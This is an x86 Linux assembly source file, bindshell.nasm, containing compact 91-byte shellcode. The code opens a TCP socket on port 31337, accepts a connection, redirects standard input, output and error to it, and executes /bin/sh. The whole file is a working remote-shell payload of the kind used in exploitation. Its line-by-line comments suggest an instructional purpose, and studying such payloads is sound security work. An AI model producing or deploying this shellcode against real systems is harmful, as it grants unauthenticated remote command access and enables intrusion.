; Filename: bindshell.nasm
; Author:  Re4son re4son [at] whitedome.com.au
; Website:  http://www.whitedome.com.au/re4son
;
; Purpose: Spawn a bind shell on port 31337
;          91 bytes


global _start           

section .text

_start:

    ; --- socket ---

    xor ebx, ebx    	; clear ebx
    mul ebx	    	; clear eax and edx
    mov bl, 0x1     	; store socket call identifier in bl

    ; push socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6) parameters
    push 0x6
    push ebx
    push 0x2
    
    mov ecx, esp    	; store pointer to arguments in ecx
    
    ; issue system call
    mov al, 0x66    	; store sys_socketcall system call number in al
    mov edi, eax    	; copy away for later re-use
    int 0x80        	; execute system call
    xchg esi, eax   	; store the socket file descriptor in esi, optimized way


    ; --- bind ---

    inc ebx	    	; increase the sub call function number to 2 for bind

    ; push bind() parameters
    push edx        	; INADDR_ANY
    push word 0x697A	; port
    push word bx   	; AF_INET

    mov ecx, esp    	; store pointer to the structure in ecx

    push 0x10         	; sizeof(struct sockaddr_in)
    push ecx        	; &serv_addr
    push esi        	; our socket descriptor

    mov ecx, esp    	; store pointer to arguments in ecx

    ; issue system call
    mov eax, edi    	; store sys_socketcall system call number in eax
    int 0x80        	; execute system call


    ; --- listen ---
    ; push listen(sockfd=esi, backlog=0) parameters
    push edx        	; backlog
    push esi        	; sockfd

    mov bl, 0x4     	; store listen call identifier in bl
    mov ecx, esp    	; store pointer to arguments in ecx

    ; issue system call
    mov eax, edi    	; store sys_socketcall system call number in eax
    int 0x80        	; execute system call


    ; accept
    ; push accept(sockfd, NULL, NULL) parameters
    push edx        	; NULL addrlen
    push edx        	; NULL sockaddr
    push esi        	; sockfd

    inc ebx	    	; increase sub function number in bl to 5
    mov ecx, esp    	; store pointer to arguments in ecx

    ; issue system call
    mov eax, edi    	; store sys_socketcall system call number in eax
    int 0x80        	; execute system call
    xchg ebx, eax    	; store the new socket file descriptor in ebx for dup2

    ; Move STDIN, STDOUT & STDERR to our new socket
    xor ecx, ecx	; clear ecx
    mov cl, 0x2		; loop counter
    loop:
        mov al, 0x3f    ; store sys_dup2 system call number in al
        int 0x80	; execute system call
        dec ecx 
        jns loop

    ; execute /bin/sh
    ; execve("/bin/sh", 0, 0);
    mov ecx, edx        ; clear ecx  
    push edx        	; push NULL termination
    push 0x68732f2f 	; //sh (we can add a slash to make it four non NULL bytes)
    push 0x6e69622f 	; /bin
    mov ebx, esp    	; store address of /bin/sh
  
    mov al, 0xb     	; store execve system call number in al  
    int 0x80        	; execute system call
